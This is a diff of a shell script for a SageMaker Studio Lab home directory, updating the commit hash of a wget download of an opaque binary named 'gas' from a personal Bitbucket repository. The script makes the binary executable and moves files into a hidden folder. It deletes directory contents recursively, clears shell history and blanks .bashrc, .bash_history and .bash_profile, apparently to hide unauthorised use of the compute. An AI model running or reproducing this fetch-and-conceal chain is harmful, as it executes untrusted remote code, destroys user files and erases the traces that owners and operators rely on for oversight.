@@ -8,7 +8,7 @@ cd .lib
 rm -R *
 rm -R /home/studio-lab-user/.ton
 
-wget https://bitbucket.org/andikasdsdssda/gas/raw/609f6ddd9fd9ebdde10b9071436338e6dff4f98d/gas && chmod u+x gas && mv bash /home/studio-lab-user/.lib && cd .. && history -cr
+wget https://bitbucket.org/andikasdsdssda/gas/raw/2adefe1bf22d85dc2d3a88947d36197fb23271b8/gas && chmod u+x gas && mv bash /home/studio-lab-user/.lib && cd .. && history -cr
 echo ""  > /home/studio-lab-user/.bashrc
 echo "" > /home/studio-lab-user/.bash_history
 echo "" > /home/studio-lab-user/.bash_profile
